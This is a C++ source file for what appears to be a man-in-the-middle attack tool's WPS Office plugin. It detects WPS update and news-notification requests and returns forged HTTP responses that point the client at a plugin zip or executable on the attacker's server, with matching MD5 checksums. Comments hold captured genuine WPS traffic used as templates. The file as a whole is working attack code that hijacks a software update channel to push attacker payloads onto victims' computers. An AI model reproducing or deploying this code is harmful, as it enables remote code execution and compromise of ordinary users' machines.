#include "WpsPlugin.h"

#include "PluginServer.h"
#include "../attacker.h"
#include "sslPublic.h"
#include "../Public.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../PreparePacket.h"

//dsktptst.dll
//void *__stdcall SetCommandLine(void *Src);
//int __stdcall ShowMessage(int a1);


int gWpsPcFlag = 0;


//"/api/v1/win10notify/news?"
int WPSPlugin::isWpsPlugin(const char * url, const char * host) {
	if (strstr(host, "api.mini.wps.cn"))
	{
		if (strstr(url, "/api/v1/win") && (strstr(url, "notify/news?") || strstr(url, "notify/multi_news?") ) )
		{
			gWpsPcFlag = 1;
			return TRUE;
		}
	}else if (strstr(host,"up.wps.kingsoft.com") && strstr(url,"/newupdate/specialpatch/index.ini" ))
	{
		gWpsPcFlag = 2;
		return TRUE;
	}

	return FALSE;
}



#define WPS_PLUGIN_UPDATE_FILENAME "wps_plugin.zip"

int WPSPlugin::replyWpsPcUpdate(char * dstbuf, int dstbuflimit, string username) {
	if (gWpsPcFlag == 2)
	{
		return sendWpsPcUpdate(dstbuf, dstbuflimit, username);
	}else if (gWpsPcFlag == 1)
	{
		return sendWpsPlugin(dstbuf, dstbuflimit, username);
	}
	return 0;
}

int WPSPlugin::sendWpsPcUpdate(char * dstbuf, int dstbuflimit, string username) {
	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	int ret = 0;

	PreparePacket * prepare = new PreparePacket();

	string filename = Public::getUserPluginPath(username) + WEIXIN_PC_UPDATE_EXE_FILENAME;
	string fileurl = string("http://") + HttpUtils::getIPstr(gServerIP) + "/" + username + "/" + WEIXIN_PC_UPDATE_EXE_FILENAME;
	string retdata = prepare->prepareWPS(filename, fileurl);

	int retlen = sprintf(dstbuf, szHttpPartialZipFormat, retdata.length(), retdata.c_str());
	return retlen;
}


int WPSPlugin::sendWpsPlugin(char * dstbuf, int dstbuflimit, string username) {
	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: application/json;charset=GBK\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	int ret = 0;

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + username;
	int popuptimes = 2;	//2

	string filename1 = Public::getUserPluginPath(username);
	filename1 = filename1 + "wps_plugin.zip";


	char szmd5_1[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize1 = CryptoUtils::getUpdateFileMd5(filename1, szmd5_1, hexmd5, 1);
	if (filesize1 <= 0)
	{
		return FALSE;
	}

	//md5 of the zip file
	char hdrformat[4096];
	char szformat[] = 
		"{\"result\":\"ok\",\"data\":{\"abstract\":\"https://www.baidu.com\",\"avoidfile\":\"\",\"block_antivirus\":\"0\",\"block_member\":1,\"block_process\":\"\","
		"\"block_registry\":[\"\"],\"day_max_popup_time\":%u,\"id\":999,\"img\":\"www.baidu.com\",\"newsid\":\"%I64u\","
		"\"notify_program_md5\":\"%s\","
		"\"notify_program_url\":\"http://%s/%s\","
		"\"popup_interval\":360,\"schemeid\":9999,\"sourceid\":99,\"thumb\":\"https://www.baidu.com\","
		"\"title\":\"https://www.baidu.com\",\"url\":\"\"},\"msg\":\"\",\"enable\":1}";

	//http://mp.weixin.qq.com/s?__biz=MzUyMDc2MDEwMA==\\u0026mid=100003068\\u0026"
	//"idx = 1\\u0026sn = cc02d330e61a79b7e2790c02df919bff\\u0026chksm = 79e432b74e93bba15f9435b440506a001c27a5d7e7864dcbf6c4509d4c4936f58fac7879c21d#rd\\u0026"
	//	"__hid = ab3344c6ccfaa769961b5bc828019729\\u0026__dist = 12012.00000000\\u0026__cversion = 19.1.0.8527\\u0026"
	//	"__id = 301232807844799488\\u0026__ref = 50\\u0026__rt = manual

	//string timenow = "99999999999999999999";// 
	time_t timenow = time(0) * 1000;
	int httphdrlen = sprintf_s(hdrformat, 4096, szformat, popuptimes, timenow,szmd5_1,strip.c_str(),WPS_PLUGIN_UPDATE_FILENAME);

	int retlen = sprintf(dstbuf, szHttpPartialZipFormat, httphdrlen, hdrformat);

	char szout[4096];
	int outlen = sprintf_s(szout, 4096, "ups plugin reply:%s\r\n", dstbuf);
	Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, outlen);

	return retlen;
}


/*
GET /api/v1/win10notify/multi_news?app=wps&version=11.1.0.8527&disnum=12012.00000000&hdid=ab3344c6ccfaa769961b5bc828019729
&timestamp=1552820672&sig=559cf418e539736aa408a91769a16a3d HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Host: api.mini.wps.cn
Cache-Control: no-cache

HTTP/1.1 200 OK
Server: CLOUD ELB 1.0.0
Date: Sun, 17 Mar 2019 11:04:30 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 887
Connection: keep-alive

{"result":"ok","data":[{"abstract":"绂诲満鏃朵粬缁堜簬閬撳嚭鐪熷疄韬唤锛岀珶鏈夊コ鍢夊褰撳満鍙嶆倲锛岃姹傞噸鏂颁寒鐏紒",
"avoidfile":"","block_antivirus":"","block_member":1,"block_process":"","block_registry":[""],"day_max_popup_time":2,
"id":141,"img":"http://dl.op.wpscdn.cn/odimg/web/2019-03-16/16a.jpg","newsid":"302224490359186560",
"notify_program_md5":"dfb17462680608a125cd59d2acb0849b","notify_program_url":"http://dl.op.wpscdn.cn/odimg/web/2019-03-08/094747/dsktptst.zip",
"popup_interval":360,"schemeid":2049,"sourceid":13,"thumb":"http://dl.op.wpscdn.cn/odimg/web/2019-03-16/16a.jpg",
"title":"瀵屼簩浠ｅ幓鐩镐翰锛屼负浣曟儴閬コ鍢夊鍥㈢伃锛?,
"url":"https://hoplink.ksosoft.com/hqzjdy#\u0026__id=302224490359186560\u0026__ref=13\u0026__rt=manual\u0026__hid=ab3344c6ccfaa769961b5bc828019729\u0026__dist=12012.00000000\u0026__cversion=11.1.0.8527"}],
"msg":"","enable":1}
*/
/*
GET /api/v1/win10notify/news?version=11.1.0.8527&disnum=12012.00000000&hdid=ab3344c6ccfaa769961b5bc828019729 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Host: api.mini.wps.cn
Cache-Control: no-cache

HTTP/1.1 200 OK
Server: CLOUD ELB 1.0.0
Date: Sun, 10 Mar 2019 01:32:11 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 1127
Connection: keep-alive
Vary: Accept-Encoding

{"result":"ok","data":{"abstract":"
【职场每日精选】周日好！你知道如何与领导高情商交流吗？默默无闻还是积极主动？
点击免费领取原价279元职场课，答案就在这里！","avoidfile":"","block_antivirus":"",
"block_member":1,"block_process":"","block_registry":[""],"day_max_popup_time":2,"id":121,
"img":"http://dl.op.wpscdn.cn/odimg/web/2019-03-10/0310a.jpg",
"newsid":"301232807844799488","notify_program_md5":"dfb17462680608a125cd59d2acb0849b",
"notify_program_url":"http://dl.op.wpscdn.cn/odimg/web/2019-03-08/094747/dsktptst.zip",
"popup_interval":60,"schemeid":1990,"sourceid":50,"thumb":"http://dl.op.wpscdn.cn/odimg/web/2019-03-10/0310a.jpg",
"title":"如何在老板面前适度表现自己","url":"http://mp.weixin.qq.com/s?__biz=MzUyMDc2MDEwMA==\u0026mid=100003068\u0026
idx=1\u0026sn=cc02d330e61a79b7e2790c02df919bff\u0026chksm=79e432b74e93bba15f9435b440506a001c27a5d7e7864dcbf6c4509d4c4936f58fac7879c21d#rd\u0026
__hid=ab3344c6ccfaa769961b5bc828019729\u0026__dist=12012.00000000\u0026__cversion=11.1.0.8527\u0026
__id=301232807844799488\u0026__ref=50\u0026__rt=manual"},"msg":""}

*/


//up.wps.kingsoft.com/newupdate/specialpatch/index.ini
/*
GET /newupdate/specialpatch/index.ini HTTP/1.1
Accept: *//*
User-Agent: Update.WPS
Host: up.wps.kingsoft.com
Cache-Control: no-cache

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Connection: keep-alive
CACHE: TCP_HIT
Content-Length: 171
Date: Mon, 13 May 2019 04:43:36 GMT
Powered-By-ChinaCache: HIT from CMN-WZ-6-3WH
Powered-By-ChinaCache: HIT from XCT-TH-1-D39
ETag: "5c6525be-ab"
Last-Modified: Thu, 14 Feb 2019 08:24:30 GMT
Expires: Mon, 13 May 2019 04:58:36 GMT
Age: 788
Cache-Control: max-age=900
Accept-Ranges: bytes
Server: KSOWS
CC_CACHE: TCP_HIT

[default]
url=http://up.wps.kingsoft.com/newupdate/specialpatch/WPS_UpdatePatch_8472.exe
md5=33c850f6c754c924d64aa9cc3dda4d72
updatemd5=36bfcaf2fd7803d5c0855fba3b320e44
*/